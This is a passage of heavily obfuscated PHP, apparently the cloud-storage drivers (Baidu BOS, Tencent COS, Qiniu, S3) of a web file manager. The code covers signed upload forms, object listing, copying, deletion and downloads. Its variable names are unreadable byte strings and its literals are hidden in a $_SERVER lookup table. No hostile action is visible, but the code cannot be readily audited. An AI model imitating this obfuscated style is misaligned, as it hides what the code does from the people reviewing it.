$ÜäÂúêò[1362] => $ÙäÌ•˜è->pathDriver, $ÜäÂúêò[86] => $Œ˜„Èõ, $ÜäÂúêò[97] => $ÙäÌ•˜è); } public static function pathDriverType($û¦Ş½«À) { return $û¦Ş½«À ? self::driverType(IO::init($û¦Ş½«À)) : !1; } public static function pathDriverLocal($ã…èÊÍ³) { $ÅíÀõ©É =& $_SERVER[èùÙ¹Ïö]; $ÄÒ»¼± = $ã…èÊÍ³ ? self::driverType(IO::init($ã…èÊÍ³)) : !1; return $ÄÒ»¼±[$ÅíÀõ©É[33]] == $ÅíÀõ©É[108] ? !0 : !1; } public static function allowCover($ŠÈÄÛ°´, $•³Ãù„ = true) { $£ ª»õ =& $_SERVER[èùÙ¹Ïö]; if (is_string($ŠÈÄÛ°´)) { $ŠÈÄÛ°´ = IO::info($ŠÈÄÛ°´); } if (!$ŠÈÄÛ°´ || $ŠÈÄÛ°´[$£ ª»õ[33]] == $£ ª»õ[77] || $ŠÈÄÛ°´[$£ ª»õ[78]] <= 100) { return !1; } if (isset($ŠÈÄÛ°´[$£ ª»õ[1369]]) || !$ŠÈÄÛ°´[$£ ª»õ[86]]) { return !1; } if (isset($ŠÈÄÛ°´[$£ ª»õ[218]]) && !$ŠÈÄÛ°´[$£ ª»õ[218]]) { return !1; } static $•­¯ƒÁ÷ = false; if (!$•­¯ƒÁ÷ || !$•³Ãù„) { $àæŸœ²¡ = self::driverType(IO::init($ŠÈÄÛ°´[$£ ª»õ[86]])); $îØÜ…ë = $àæŸœ²¡[$£ ª»õ[97]]; $•­¯ƒÁ÷ = $£ ª»õ[186]; if ($àæŸœ²¡[$£ ª»õ[33]] == $£ ª»õ[108]) { $•­¯ƒÁ÷ = $£ ª»õ[1370]; } if ($àæŸœ²¡[$£ ª»õ[97]] && is_array($àæŸœ²¡[$£ ª»õ[97]]->config)) { $ùÔ‹Æšƒ = $àæŸœ²¡[$£ ª»õ[97]]->config; if (isset($ùÔ‹Æšƒ[$£ ª»õ[1371]]) && $ùÔ‹Æšƒ[$£ ª»õ[1371]]) { $•­¯ƒÁ÷ = $£ ª»õ[1370]; } } } return $•­¯ƒÁ÷ == $£ ª»õ[1370] ? !0 : !1; } } class PathDriverBOS extends PathDriverBaseS3 { public function __construct($ÃëÒªƒë) { parent::__construct($ÃëÒªƒë); } public function getHost() { $Ì–Šäì» =& $_SERVER[èùÙ¹Ïö]; $ø÷È±¢ = str_rtrim(parent::getHost(), $Ì–Šäì»[8] . $this->bucket); $ø÷È±¢ = explode($Ì–Šäì»[200], $ø÷È±¢); return $ø÷È±¢[0] . $Ì–Šäì»[200] . $this->bucket . $Ì–Šäì»[1372] . $ø÷È±¢[1]; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¡ë—êîƒ) { parent::__construct($¡ë—êîƒ); $this->signatureVersion($_SERVER[èùÙ¹Ïö][233]); } public function uploadFormData($ò‘ıÛ×°, $Ëš¢«­Â = 3600) { $Õ¿×óÆº =& $_SERVER[èùÙ¹Ïö]; $Öõ˜“ó¶ = $Õ¿×óÆº[215]; $ô£˜Ü“ = $Õ¿×óÆº[249]; $¼‹¬ß§ = $Õ¿×óÆº[259]; $¾ÃŸÄÚ¤ = gmdate($Õ¿×óÆº[1373], time() + $Ëš¢«­Â); $øÓ„­– = (string) time() . $Õ¿×óÆº[73] . (string) (time() + $Ëš¢«­Â); $ı¥®–– = array($Õ¿×óÆº[260] => $¾ÃŸÄÚ¤, $Õ¿×óÆº[263] => array(array($Õ¿×óÆº[265] => $Öõ˜“ó¶), array($Õ¿×óÆº[264] => $this->bucket), array($Õ¿×óÆº[266], $Õ¿×óÆº[267], $Õ¿×óÆº[12]), array($Õ¿×óÆº[270] => $¼‹¬ß§), array($Õ¿×óÆº[1374] => $ô£˜Ü“), array($Õ¿×óÆº[1375] => $this->accessKey), array($Õ¿×óÆº[1376] => $øÓ„­–))); $ı¥®–– = json_encode($ı¥®––); $¶ËÄÀÏ = hash_hmac($Õ¿×óÆº[249], $øÓ„­–, $this->secret); $’ìó¹ïÔ = sha1($ı¥®––); $¿ã±²Ôù = hash_hmac($Õ¿×óÆº[249], $’ìó¹ïÔ, $¶ËÄÀÏ); $õ¢ï·Ğ€ = array($Õ¿×óÆº[265] => $Öõ˜“ó¶, $Õ¿×óÆº[270] => $¼‹¬ß§, $Õ¿×óÆº[278] => base64_encode($ı¥®––), $Õ¿×óÆº[1374] => $ô£˜Ü“, $Õ¿×óÆº[1375] => $this->accessKey, $Õ¿×óÆº[1377] => $øÓ„­–, $Õ¿×óÆº[1378] => $¿ã±²Ôù, $Õ¿×óÆº[198] => $this->getHost()); return $õ¢ï·Ğ€; } public function fileOutLink($şê­Ú½ã) { $¶Ù®Å©‹ =& $_SERVER[èùÙ¹Ïö]; if (substr($şê­Ú½ã, 0, 7) == $¶Ù®Å©‹[1379]) { $şê­Ú½ã = $¶Ù®Å©‹[1380] . substr($şê­Ú½ã, 7); } header($¶Ù®Å©‹[164] . $şê­Ú½ã); die; } } goto E…„°Â÷š; fª¡Ù£ÒßÎ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($”†½¸ñ) { parent::__construct(); require_once SDK_DIR . $_SERVER[èùÙ¹Ïö][1461]; $this->_init($”†½¸ñ); } public function _init($„ÎÖ¢Ñú) { $ª‹ÁßŒô =& $_SERVER[èùÙ¹Ïö]; $this->config = $„ÎÖ¢Ñú; foreach ($„ÎÖ¢Ñú as $ö°¯¨¢ê => $ÄœŒŒ¦) { if (isset($this->{$ö°¯¨¢ê})) { $this->{$ö°¯¨¢ê} = $ÄœŒŒ¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ª‹ÁßŒô[1462] . LNG($ª‹ÁßŒô[1421])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($©¦ÉüÄµ, $„“şÏ¢õ = '', $ÅäéÉ„‡ = REPEAT_RENAME) { if ($this->setContent($©¦ÉüÄµ, $„“şÏ¢õ)) { return $this->getPathOuter($©¦ÉüÄµ); } return !1; } public function mkdir($°ÖÁñå, $µ‰‚ÇÏ¸ = REPEAT_SKIP) { $«´²ÆÍ’ =& $_SERVER[èùÙ¹Ïö]; $ÑŒ®ÂÓÍ = trim($°ÖÁñå, $«´²ÆÍ’[8]); if ($this->_isFolder($ÑŒ®ÂÓÍ)) { return $this->getPathOuter($ÑŒ®ÂÓÍ); } $°ÖÁñå = $ÑŒ®ÂÓÍ . $«´²ÆÍ’[8]; $ş¹œãÎÍ = get_path_this($ÑŒ®ÂÓÍ); $¥§ˆ›âÃ = $°ÖÁñå . $ş¹œãÎÍ; if (!$this->mkfile($¥§ˆ›âÃ)) { return !1; } if (!$this->moveFile($¥§ˆ›âÃ, $°ÖÁñå)) { $this->delFile($¥§ˆ›âÃ); return !1; } return $this->getPathOuter($ÑŒ®ÂÓÍ); } public function copyFile($ ®›øŸ, $¡§çÒÖá) { $õ‚´Ş¸ = $this->bucketManager->copy($this->bucket, $ ®›øŸ, $this->bucket, $¡§çÒÖá, !0); return $õ‚´Ş¸ ? !1 : $this->getPathOuter($¡§çÒÖá); } public function moveFile($Å«ÎŞ–, $°ıìŞë) { $Š¡‘—şò = $this->bucketManager->move($this->bucket, $Å«ÎŞ–, $this->bucket, $°ıìŞë, !0); return $Š¡‘—şò ? !1 : $this->getPathOuter($°ıìŞë); } public function delFile($“”ßë¶) { if (!$this->exist($“”ßë¶)) { return !0; } $ñˆøË¹È = $this->bucketManager->delete($this->bucket, $“”ßë¶); return $ñˆøË¹È ? !1 : !0; } public function delFolder($×ı´éŠÎ) { $êÈÃòøØ =& $_SERVER[èùÙ¹Ïö]; if (!$this->exist($×ı´éŠÎ)) { return !0; } $this->listItemCache = !1; $ı³¾Ñ®ö = $this->fileList($×ı´éŠÎ); $this->listItemCache = !0; $¡æî“¼õ = trim($×ı´éŠÎ, $êÈÃòøØ[8]) . $êÈÃòøØ[8]; if (!empty($×ı´éŠÎ) && $×ı´éŠÎ !== $êÈÃòøØ[214] && !in_array($¡æî“¼õ, $ı³¾Ñ®ö[$êÈÃòøØ[84]])) { $ı³¾Ñ®ö[$êÈÃòøØ[84]][] = $¡æî“¼õ; } $Ò™åÎŞ¶ = $this->delByBatch($ı³¾Ñ®ö[$êÈÃòøØ[85]]); if (!$Ò™åÎŞ¶) { return !1; } $Ò™åÎŞ¶ = $this->delByBatch($ı³¾Ñ®ö[$êÈÃòøØ[84]]); if (!$Ò™åÎŞ¶) { return !1; } return $this->delFile($¡æî“¼õ); } private function delByBatch($§ğõÖì§) { foreach (array_chunk($§ğõÖì§, 1000) as $¿ŞçÉ§§) { $Ë¾˜±ò = $this->bucketManager->buildBatchDelete($this->bucket, $¿ŞçÉ§§); list($àèêİš, $ƒÖ·÷ÓÌ) = $this->bucketManager->batch($Ë¾˜±ò); if ($ƒÖ·÷ÓÌ) { return !1; } } return !0; } public function rename($ıœÇÜÆƒ, $×‹´¾˜¬) { return $this->renameObject($ıœÇÜÆƒ, $×‹´¾˜¬); } public function fileInfo($²í »Ğá, $ÙúÌº• = false, $©§Í•ã = array()) { $å×«¤Ÿ× =& $_SERVER[èùÙ¹Ïö]; $şöÜ‡—¡ = array($å×«¤Ÿ×[32] => $this->pathThis($²í »Ğá), $å×«¤Ÿ×[86] => $this->getPathOuter($å×«¤Ÿ×[8] . $²í »Ğá), $å×«¤Ÿ×[33] => $å×«¤Ÿ×[216], $å×«¤Ÿ×[78] => isset($©§Í•ã[$å×«¤Ÿ×[1463]]) ? $©§Í•ã[$å×«¤Ÿ×[1463]] : 0, $å×«¤Ÿ×[177] => $this->ext($²í »Ğá)); if ($ÙúÌº•) { return $şöÜ‡—¡; } $şöÜ‡—¡[$å×«¤Ÿ×[217]] = $şöÜ‡—¡[$å×«¤Ÿ×[87]] = 0; $şöÜ‡—¡[$å×«¤Ÿ×[218]] = $şöÜ‡—¡[$å×«¤Ÿ×[219]] = !0; if (empty($©§Í•ã)) { $©§Í•ã = $this->objectMeta($²í »Ğá); if (!$©§Í•ã) { return $şöÜ‡—¡; } } if (isset($©§Í•ã[$å×«¤Ÿ×[220]]) && $©§Í•ã[$å×«¤Ÿ×[220]]) { $şöÜ‡—¡[$å×«¤Ÿ×[221]] = $©§Í•ã[$å×«¤Ÿ×[220]]; } if (isset($©§Í•ã[$å×«¤Ÿ×[230]]) && $©§Í•ã[$å×«¤Ÿ×[230]]) { $şöÜ‡—¡[$å×«¤Ÿ×[221]] = $©§Í•ã[$å×«¤Ÿ×[230]]; } if (isset($©§Í•ã[$å×«¤Ÿ×[1464]])) { $şöÜ‡—¡[$å×«¤Ÿ×[87]] = substr($©§Í•ã[$å×«¤Ÿ×[1464]] . $å×«¤Ÿ×[12], 0, 10); } if (isset($©§Í•ã[$å×«¤Ÿ×[1463]])) { $şöÜ‡—¡[$å×«¤Ÿ×[78]] = $©§Í•ã[$å×«¤Ÿ×[1463]]; } return $şöÜ‡—¡; } public function folderInfo($¢ñ«ˆØÅ, $ªæŒİÊŸ = false) { $õÂûİ‰¡ =& $_SERVER[èùÙ¹Ïö]; $Ú‡«¨ı§ = array($õÂûİ‰¡[32] => $this->pathThis($¢ñ«ˆØÅ), $õÂûİ‰¡[86] => $this->getPathOuter($õÂûİ‰¡[8] . $¢ñ«ˆØÅ), $õÂûİ‰¡[33] => $õÂûİ‰¡[77]); if ($ªæŒİÊŸ) { return $Ú‡«¨ı§; } $Ú‡«¨ı§[$õÂûİ‰¡[217]] = $Ú‡«¨ı§[$õÂûİ‰¡[87]] = 0; $Ú‡«¨ı§[$õÂûİ‰¡[218]] = $Ú‡«¨ı§[$õÂûİ‰¡[219]] = !0; $¢ñ«ˆØÅ = rtrim($¢ñ«ˆØÅ, $õÂûİ‰¡[8]) . $õÂûİ‰¡[8]; $­ÏÜİÉù = $this->objectMeta($¢ñ«ˆØÅ); if (isset($­ÏÜİÉù[$õÂûİ‰¡[1464]])) { $Ú‡«¨ı§[$õÂûİ‰¡[87]] = substr($­ÏÜİÉù[$õÂûİ‰¡[1464]] . $õÂûİ‰¡[12], 0, 10); } return $Ú‡«¨ı§; } public function listPath($¯×©Èøæ, $êø•‚¦ = false) { $Å÷Âåâì =& $_SERVER[èùÙ¹Ïö]; $Ì®Õ§Ò‘ = $this->fileList($¯×©Èøæ, $Å÷Âåâì[8], !0); foreach ($Ì®Õ§Ò‘[$Å÷Âåâì[84]] as $ÔšÌÜÙâ => $ÂÍë®şß) { $Ì®Õ§Ò‘[$Å÷Âåâì[84]][$ÔšÌÜÙâ] = $this->folderInfo($ÂÍë®şß, $êø•‚¦); } foreach ($Ì®Õ§Ò‘[$Å÷Âåâì[85]] as $ÔšÌÜÙâ => $ÂÍë®şß) { $Ì®Õ§Ò‘[$Å÷Âåâì[85]][$ÔšÌÜÙâ] = $this->fileInfo($ÂÍë®şß[$Å÷Âåâì[96]], $êø•‚¦, $ÂÍë®şß); } return $Ì®Õ§Ò‘; } public function has($”ï¿ı™, $Ø’á°©‰ = false, $ı‡ÇëÁ = true) { $ßÇ§Ô…Ò =& $_SERVER[èùÙ¹Ïö]; $”ï¿ı™ = trim($”ï¿ı™, $ßÇ§Ô…Ò[8]); $¡ô‚£·Ò = empty($”ï¿ı™) && $”ï¿ı™ !== $ßÇ§Ô…Ò[214] ? $ßÇ§Ô…Ò[12] : $”ï¿ı™ . $ßÇ§Ô…Ò[8]; $Ï©ÑÖÅ© = $ßÇ§Ô…Ò[12]; $½ŸŠªë = 500; $ÛÍ©˜¾¦ = $ßÇ§Ô…Ò[8]; $åµğĞà¸ = $ª°ğŸÃ = 0; while (!0) { check_abort(); list($â™öùÑÂ, $¼–Ş¦ÇØ) = $this->bucketManager->listFiles($this->bucket, $¡ô‚£·Ò, $Ï©ÑÖÅ©, $½ŸŠªë, $ÛÍ©˜¾¦); if ($¼–Ş¦ÇØ) { break; } $Ï©ÑÖÅ© = array_key_exists($ßÇ§Ô…Ò[1433], $â™öùÑÂ) ? $Ï©ÑÖÅ© = $â™öùÑÂ[$ßÇ§Ô…Ò[1465]] : $ßÇ§Ô…Ò[12]; if ($Ø’á°©‰) { if (!empty($â™öùÑÂ[$ßÇ§Ô…Ò[1466]])) { $åµğĞà¸ += count($â™öùÑÂ[$ßÇ§Ô…Ò[1466]]); } if (!empty($â™öùÑÂ[$ßÇ§Ô…Ò[1467]])) { $ª°ğŸÃ += count($â™öùÑÂ[$ßÇ§Ô…Ò[1467]]); } if ($Ï©ÑÖÅ© === $ßÇ§Ô…Ò[12]) { break; } continue; } if ($ı‡ÇëÁ) { if (!empty($â™öùÑÂ[$ßÇ§Ô…Ò[1466]])) { return !0; } } else { if (!empty($â™öùÑÂ[$ßÇ§Ô…Ò[1467]])) { return !0; } } if ($Ï©ÑÖÅ© === $ßÇ§Ô…Ò[12]) { break; } } if ($Ø’á°©‰) { return array($ßÇ§Ô…Ò[225] => $åµğĞà¸, $ßÇ§Ô…Ò[226] => $ª°ğŸÃ); } return !1; } public function listAll($ÎÊ‰ïö) { $‚¶ÂÑ©ş =& $_SERVER[èùÙ¹Ïö]; $À„‹»À = $this->fileList($ÎÊ‰ïö, $‚¶ÂÑ©ş[12], !0); $ø÷Ù¬Ì® = array_to_keyvalue($À„‹»À[$‚¶ÂÑ©ş[85]], $‚¶ÂÑ©ş[32]); foreach ($À„‹»À[$‚¶ÂÑ©ş[84]] as $¢¢êºñİ) { if (is_string($¢¢êºñİ)) { $ø÷Ù¬Ì®[$¢¢êºñİ] = array($‚¶ÂÑ©ş[78] => 0); } } return $this->listAllFiles($ÎÊ‰ïö, $ø÷Ù¬Ì®); } private function fileList($ô‚­·¯Å, $éôœÛì° = '', $İ©‚ÔÛš = 0) { $¿÷àÇ =& $_SERVER[èùÙ¹Ïö]; $ô‚­·¯Å = trim($ô‚­·¯Å, $¿÷àÇ[8]); $©Îµ­‰³ = empty($ô‚­·¯Å) && $ô‚­·¯Å !== $¿÷àÇ[214] ? $¿÷àÇ[12] : $ô‚­·¯Å . $¿÷àÇ[8]; $ß£Âç•Ñ = $¿÷àÇ[12]; $Ô«ÁºŞ = 1000; $×™•ôÜ¸ = $¿ÃÖ“÷ë = array(); while (!0) { check_abort(); list($¹ùî´á¯, $×§¤¥úÍ) = $this->bucketManager->listFiles($this->bucket, $©Îµ­‰³, $ß£Âç•Ñ, $Ô«ÁºŞ, $éôœÛì°); if ($×§¤¥úÍ) { break; } $ß£Âç•Ñ = array_key_exists($¿÷àÇ[1433], $¹ùî´á¯) ? $ß£Âç•Ñ = $¹ùî´á¯[$¿÷àÇ[1465]] : $¿÷àÇ[12]; $çÈ”ºÃĞ = isset($¹ùî´á¯[$¿÷àÇ[1466]]) ? $¹ùî´á¯[$¿÷àÇ[1466]] : array(); $÷³¸’Ñæ = isset($¹ùî´á¯[$¿÷àÇ[1467]]) ? $¹ùî´á¯[$¿÷àÇ[1467]] : array(); foreach ($çÈ”ºÃĞ as $¯Ãåœá…) { if ($¯Ãåœá…[$¿÷àÇ[96]] == $©Îµ­‰³) { continue; } $ß²úÎÊ„ = $¯Ãåœá…[$¿÷àÇ[96]]; $ù•¼îº = $¯Ãåœá…[$¿÷àÇ[1463]]; $¯Ãåœá…[$¿÷àÇ[78]] = $ù•¼îº; $Ë½ØëÒ¾ = $ù•¼îº == 0 && substr($ß²úÎÊ„, strlen($ß²úÎÊ„) - 1, 1) == $¿÷àÇ[8] ? !0 : !1; $this->cacheMethodInfoSet($ß²úÎÊ„, $Ë½ØëÒ¾, $¯Ãåœá…); if ($Ë½ØëÒ¾) { $×™•ôÜ¸[] = $ß²úÎÊ„; continue; } $¿ÃÖ“÷ë[] = $İ©‚ÔÛš ? $¯Ãåœá… : $ß²úÎÊ„; } foreach ($÷³¸’Ñæ as $ß²úÎÊ„) { if ($ß²úÎÊ„ == $©Îµ­‰³) { continue; } $×™•ôÜ¸[] = $ß²úÎÊ„; $this->cacheMethodInfoSet($ß²úÎÊ„, !0); } if ($ß£Âç•Ñ === $¿÷àÇ[12]) { break; } } $this->cacheMethodInfoSet($ô‚­·¯Å, !0); return array($¿÷àÇ[84] => $×™•ôÜ¸, $¿÷àÇ[85] => $¿ÃÖ“÷ë); } public function canRead($©•‰Á˜ş) { return $this->exist($©•‰Á˜ş) ? !0 : !1; } public function canWrite($î×¨£Ò…) { return $this->exist($î×¨£Ò…) ? !0 : !1; } public function getContent($í™ñ—Øİ) { return $this->fileSubstr($í™ñ—Øİ, 0, -1); } public function setContent($íôã¸· , $Ÿ€áÆ­ = '') { $É¹Ôëïš = $this->tempFile($this->pathThis($íôã¸· )); file_put_contents($É¹Ôëïš, $Ÿ€áÆ­); if ($this->upload($íôã¸· , $É¹Ôëïš)) { $this->tempFileRemve($É¹Ôëïš); return !0; } return !1; } public function refreshUrls($Ôµ¾•¡í) { $¾‹ø¶Êš =& $_SERVER[èùÙ¹Ïö]; $Æ†§ëÇï = array(); if (is_array($Ôµ¾•¡í)) { foreach ($Ôµ¾•¡í as $°å¡–Ô) { $Æ†§ëÇï[] = $this->link($°å¡–Ô); } } else { $Æ†§ëÇï[] = $this->link($Ôµ¾•¡í); } $ƒÄÚ’’  = new Qiniu\Cdn\CdnManager($this->auth); list($ÕÃ˜ÄÎ, $ŒÇğ¢æÓ) = $ƒÄÚ’’ ->refreshUrls($Æ†§ëÇï); if ($ŒÇğ¢æÓ) { return !1; } return $ÕÃ˜ÄÎ[$¾‹ø¶Êš[1230]] == $¾‹ø¶Êš[799] ? !0 : !1; } public function fileSubstr($úİ¼ì, $Ì’áµ«‹, $Çæë§§) { $‹ŸÙ‰ =& $_SERVER[èùÙ¹Ïö]; if (!($¬…Ô™ûñ = $this->link($úİ¼ì))) { return !1; } $¿š—¬É¦ = !1; if ($Çæë§§ > 0) { $—Áæ» ¾ = $Ì’áµ«‹ + $Çæë§§ - 1; $¿š—¬É¦ = array($‹ŸÙ‰[1468] . $Ì’áµ«‹ . $‹ŸÙ‰[432] . $—Áæ» ¾); } $à™å°Ğ = url_request($¬…Ô™ûñ, $‹ŸÙ‰[247], !1, $¿š—¬É¦); return $à™å°Ğ[$‹ŸÙ‰[790]] ? $à™å°Ğ[$‹ŸÙ‰[1250]] : !1; } public function upload($˜×½—«’, $•ô½¦’ò, $³Öç™’ = false, $ºÔÙ¦á„ = REPEAT_REPLACE) { $×ş¡ÁŸ± = new Qiniu\Storage\UploadManager(); $´§öÔ»× = $this->auth->uploadToken($this->bucket, $˜×½—«’); $ºí£ì = get_file_mime(get_path_ext($•ô½¦’ò)); list($÷É‘·´ş, $½ÇÎ—×) = $×ş¡ÁŸ±->putFile($´§öÔ»×, $˜×½—«’, $•ô½¦’ò, null, $ºí£ì); return $½ÇÎ—× ? !1 : $this->getPathOuter($˜×½—«’); } public function uploadFormData($Æ¡“Öº½, $ëÅª²ÌŠ = 3600) { return $this->uploadToken($Æ¡“Öº½, $ëÅª²ÌŠ); } public function multiUploadFormData($µÔ©ËÄ¨, $ò·ÓªñÕ = 3600) { return $this->uploadToken($µÔ©ËÄ¨, $ò·ÓªñÕ); } private function uploadToken($š¸•ÙÊÄ, $°ß£¡ = 3600) { $¦Ìš¤Ú =& $_SERVER[èùÙ¹Ïö]; $Çáä²¿Ë = $°ß£¡; $¶£®ØÉó = array($¦Ìš¤Ú[1469] => $¦Ìš¤Ú[1470]); $÷²¨ìæÆ = $š¸•ÙÊÄ; $µ²ï”Êï = $this->auth->uploadToken($this->bucket, $÷²¨ìæÆ, $Çáä²¿Ë, $¶£®ØÉó, !0); $•áË«ù– = empty($this->region) || $this->region == $¦Ìš¤Ú[1471] ? $¦Ìš¤Ú[12] : $¦Ìš¤Ú[432] . $this->region; $Ìğ‹é¢ = http_type() . "\72\57\57\165\160\x6c\157\141\x64{$•áË«ù–}\56\x71\151\156\151\x75\160\x2e\143\x6f\x6d\57"; return array($¦Ìš¤Ú[1472] => $µ²ï”Êï, $¦Ìš¤Ú[1473] => $Ìğ‹é¢); } public function download($µï’ã Ñ, $‚¢È×ªŠ) { $Ì¿•ş™³ = IO::getPathInner(IO::mkfile($‚¢È×ªŠ)); if (!($§«£×ë˜ = $this->link($µï’ã Ñ))) { return !1; } $óíÃ×Å = 0; $äÒåÎ±® = 1024 * 200; $­Á«˜³Ç = fopen($Ì¿•ş™³, $_SERVER[èùÙ¹Ïö][1474]); while (!0) { $ëÂë§ÕÉ = $this->fileSubstr($µï’ã Ñ, $óíÃ×Å, $äÒåÎ±®); if ($ëÂë§ÕÉ === !1) { return !1; } fwrite($­Á«˜³Ç, $ëÂë§ÕÉ); $óíÃ×Å += $äÒåÎ±®; if (strlen($ëÂë§ÕÉ) < $äÒåÎ±®) { break; } } fclose($­Á«˜³Ç); return $‚¢È×ªŠ; } public function link($µƒªØ¤ë, $Â•Äı›€ = '') { if (!$this->isFile($µƒªØ¤ë)) { return !1; } $ÆÛ§ùš = $this->getHost() . $_SERVER[èùÙ¹Ïö][8] . $this->pathEncode($µƒªØ¤ë) . $Â•Äı›€; return $this->auth->privateDownloadUrl($ÆÛ§ùš, 3600 * 12); } public function fileOut($›Ÿ°‚ô, $Ô‡âºõ™ = false, $İÃÖÂ„¬ = false, $ò÷ÇÃ×Â = '') { $¡ÂˆÉÉ¼ =& $_SERVER[èùÙ¹Ïö]; if ($this->isFileOutServer()) { return $this->fileOutServer($›Ÿ°‚ô, $Ô‡âºõ™, $İÃÖÂ„¬, $ò÷ÇÃ×Â); } if (!$İÃÖÂ„¬) { $İÃÖÂ„¬ = $this->pathThis($›Ÿ°‚ô); } $ë‘úì«™ = $Ô‡âºõ™ ? $¡ÂˆÉÉ¼[1475] . rawurlencode($İÃÖÂ„¬) : $¡ÂˆÉÉ¼[12]; $€íıõ˜ = $this->link($›Ÿ°‚ô, $ë‘úì«™); $this->fileOutLink($€íıõ˜); } public function fileOutServer($€ñ³çá, $ùú½ö = false, $šÛÚ³“™ = false, $°™Ú¼­ = '') { parent::fileOut($€ñ³çá, $ùú½ö, $šÛÚ³“™, $°™Ú¼­); } public function fileOutImage($¨ù§Ç®, $ù‘®ê—ü = 250) { $èÊÕµ¿¹ = $this->link($¨ù§Ç®, $_SERVER[èùÙ¹Ïö][1476] . $ù‘®ê—ü); $this->fileOutLink($èÊÕµ¿¹); } public function fileOutImageServer($Û¦Ç•ê, $ö‘±ëÙø = 250) { parent::fileOutImage($Û¦Ç•ê, $ö‘±ëÙø); } public function hashMd5($“Ô¯“ÛÏ) { $ì¤’¦¶ =& $_SERVER[èùÙ¹Ïö]; $”È›»¬Û = $this->objectMeta($“Ô¯“ÛÏ); return isset($”È›»¬Û[$ì¤’¦¶[230]]) ? $”È›»¬Û[$ì¤’¦¶[230]] : !1; $Ò‹¯üÜˆ = $this->link($“Ô¯“ÛÏ, $ì¤’¦¶[1477]); } public function size($ßıâŞÜ´) { $Ô²ş¯Á¨ = $this->objectMeta($ßıâŞÜ´); return $Ô²ş¯Á¨ ? $Ô²ş¯Á¨[$_SERVER[èùÙ¹Ïö][78]] : 0; } public function info($¾°ÎËù) { if ($this->isFolder($¾°ÎËù)) { return $this->folderInfo($¾°ÎËù); } else { if ($this->isFile($¾°ÎËù)) { return $this->fileInfo($¾°ÎËù); } } return !1; } public function exist($£¡¹á˜²) { return $this->isFile($£¡¹á˜²) || $this->isFolder($£¡¹á˜²); } public function isFile($ „¾ğøá) { return !$this->isFolder($ „¾ğøá) && $this->objectMeta($ „¾ğøá); } public function isFolder($ı¾˜¶àÕ) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][168], $ı¾˜¶àÕ); } protected function objectMeta($ØªôÃÜô) { return $this->cacheMethod($_SERVER[èùÙ¹Ïö][170], $ØªôÃÜô); } protected function _objectMeta($å²‹Ë¸ê) { $Ä»½Ğğ =& $_SERVER[èùÙ¹Ïö]; list($½¬ì˜ò’, $°»É¤¤¼) = $this->bucketManager->stat($this->bucket, $å²‹Ë¸ê); if ($½¬ì˜ò’) { $½¬ì˜ò’[$Ä»½Ğğ[78]] = intval($½¬ì˜ò’[$Ä»½Ğğ[1463]]); } return $½¬ì˜ò’; } protected function _isFolder($»…£ë) { $ÎµÆ‘“Ù =& $_SERVER[èùÙ¹Ïö]; if ($»…£ë == $ÎµÆ‘“Ù[12] || $»…£ë == $ÎµÆ‘“Ù[8]) { return !0; } list($ôÆŒ²ı, $­ò•²ÕÃ) = $this->bucketManager->listFiles($this->bucket, trim($»…£ë, $ÎµÆ‘“Ù[8]) . $ÎµÆ‘“Ù[8], $ÎµÆ‘“Ù[12], 1, $ÎµÆ‘“Ù[8]); return !empty($ôÆŒ²ı[$ÎµÆ‘“Ù[1466]]) || !empty($ôÆŒ²ı[$ÎµÆ‘“Ù[1467]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ãÆ¤¿ß) { parent::__construct($ãÆ¤¿ß); } public function uploadFormData($®´ìŸäş, $ÁÌ¤¶ÚÇ = 3600) { $ ˆÛ‰Éš =& $_SERVER[èùÙ¹Ïö]; $®›ÚÚ² = $ ˆÛ‰Éš[215]; $ÇæÅª«Æ = $ ˆÛ‰Éš[255]; $®ÆóÛº© = $ ˆÛ‰Éš[62]; $œŒ‹…³Æ = gmdate($ ˆÛ‰Éš[256]); $Øí©î›§ = gmdate($ ˆÛ‰Éš[257]); $¤©…øÀÔ = $ ˆÛ‰Éš[258]; $âİŞ­Ø„ = $ÁÌ¤¶ÚÇ . $ ˆÛ‰Éš[12]; $Œ§ƒ‡Ë² = $ ˆÛ‰Éš[259]; $†ÜÆ‘æŒ = array($this->accessKey, $Øí©î›§, $this->region, $®ÆóÛº©, $¤©…øÀÔ); $Ñ•×û÷Æ = implode($ ˆÛ‰Éš[8], $†ÜÆ‘æŒ); $Ø†Şû†“ = array($ ˆÛ‰Éš[260] => gmdate($ ˆÛ‰Éš[1373], strtotime($ ˆÛ‰Éš[262])), $ ˆÛ‰Éš[263] => array(array($ ˆÛ‰Éš[264] => $this->bucket), array($ ˆÛ‰Éš[265] => $®›ÚÚ²), array($ ˆÛ‰Éš[266], $ ˆÛ‰Éš[267], $ ˆÛ‰Éš[12]), array($ ˆÛ‰Éš[266], $ ˆÛ‰Éš[268], $ ˆÛ‰Éš[12]), array($ ˆÛ‰Éš[266], $ ˆÛ‰Éš[269], $ ˆÛ‰Éš[12]), array($ ˆÛ‰Éš[270] => $Œ§ƒ‡Ë²), array($ ˆÛ‰Éš[271] => $Ñ•×û÷Æ), array($ ˆÛ‰Éš[272] => $ÇæÅª«Æ), array($ ˆÛ‰Éš[273] => $œŒ‹…³Æ), array($ ˆÛ‰Éš[274] => $âİŞ­Ø„))); $©©±À¢ú = base64_encode(json_encode($Ø†Şû†“)); $®ÏÇ§Ä = hash_hmac($ ˆÛ‰Éš[275], $Øí©î›§, $ ˆÛ‰Éš[276] . $this->secret, !0); $€™Ëõ¿ä = hash_hmac($ ˆÛ‰Éš[275], $this->region, $®ÏÇ§Ä, !0); $®Í‘…Èñ = hash_hmac($ ˆÛ‰Éš[275], $®ÆóÛº©, $€™Ëõ¿ä, !0); $ Æóøï§ = hash_hmac($ ˆÛ‰Éš[275], $¤©…øÀÔ, $®Í‘…Èñ, !0); $¬¶‡ËÉÃ = hash_hmac($ 